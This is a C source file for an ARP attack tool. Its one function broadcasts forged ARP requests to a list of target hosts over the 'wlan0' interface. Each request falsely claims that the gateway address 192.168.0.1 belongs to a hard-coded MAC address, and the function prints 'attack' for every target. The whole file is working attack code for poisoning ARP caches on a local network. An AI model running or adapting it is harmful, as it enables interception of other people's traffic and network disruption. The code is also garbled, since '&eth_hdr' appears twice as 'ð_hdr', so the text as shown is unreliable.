#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <net/ethernet.h>
#include <netinet/if_ether.h>
#include <netpacket/packet.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <sys/socket.h>

#include "arp_attack.h"


void send_request_arp (addr_t *head)
{
    short DGT_MAC[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    //20-7C-8F-11-AC-3C
    short SRC_MAC[] = {0x20, 0x7c, 0x8f, 0x11, 0xac, 0x3c};
    
    char *src_ip_addr = "192.168.0.1";
    struct ether_header eth_hdr;
    memset (ð_hdr, 0, sizeof (struct ether_header));
    eth_hdr.ether_dhost[0] = DGT_MAC[0];
    eth_hdr.ether_dhost[1] = DGT_MAC[1];
    eth_hdr.ether_dhost[2] = DGT_MAC[2];
    eth_hdr.ether_dhost[3] = DGT_MAC[3];
    eth_hdr.ether_dhost[4] = DGT_MAC[4];
    eth_hdr.ether_dhost[5] = DGT_MAC[5];
    
    
    eth_hdr.ether_shost[0] = SRC_MAC[0];
    eth_hdr.ether_shost[1] = SRC_MAC[1];
    eth_hdr.ether_shost[2] = SRC_MAC[2];
    eth_hdr.ether_shost[3] = SRC_MAC[3];
    eth_hdr.ether_shost[4] = SRC_MAC[4];
    eth_hdr.ether_shost[5] = SRC_MAC[5];
    
    eth_hdr.ether_type = htons (ETHERTYPE_ARP);
    
    /* now create the arp packet */
    struct ether_arp arp;
    memset (&arp, 0, sizeof (struct ether_arp));
    arp.ea_hdr.ar_hrd = htons (ARPHRD_ETHER);
    arp.ea_hdr.ar_pro = htons (0x0800);
    arp.ea_hdr.ar_hln = 6;
    arp.ea_hdr.ar_pln = 4;
    arp.ea_hdr.ar_op = htons (ARPOP_REQUEST);
    
    int fd;
    fd = socket (AF_INET, SOCK_PACKET, htons (ETH_P_ARP));
    if (fd < 0) {
        perror ("socket\n");
        exit (EXIT_FAILURE);
    }
    
    struct sockaddr sa;
    memset (&sa, 0, sizeof (struct sockaddr));
    strcpy (sa.sa_data, "wlan0");
    
    
    char buf[60] = {'\0'};
    int hdr_len = sizeof (struct ether_header);
    
    int result;
    
    struct in_addr src_addr;
    memset (&src_addr, 0, sizeof (struct in_addr));
    inet_aton (src_ip_addr, &src_addr);
    
    
    
    addr_t *p;
    for (p = head; NULL != p; p= p->next) {
        
        //eth_hdr.ether_shost[5] = rand()%13;
        memcpy ((void *)arp.arp_sha, (void *)eth_hdr.ether_shost, 6);
        memcpy ((void *)arp.arp_spa, (void *)&src_addr, 4);
        memset (arp.arp_tha, 0, 6);
        memcpy ((void *)arp.arp_tpa, (void *)&p->sin_addr, 4);
        
        memcpy (buf, ð_hdr, hdr_len);
        memcpy (&buf[hdr_len], &arp, sizeof (struct ether_arp));
        
        result = sendto (fd, buf, sizeof (buf), 0, &sa, sizeof (sa));
        printf ("attack %s\n!!\n", inet_ntoa (p->sin_addr));  
        //sleep (2);  
    }  
    
    close (fd);  
}  
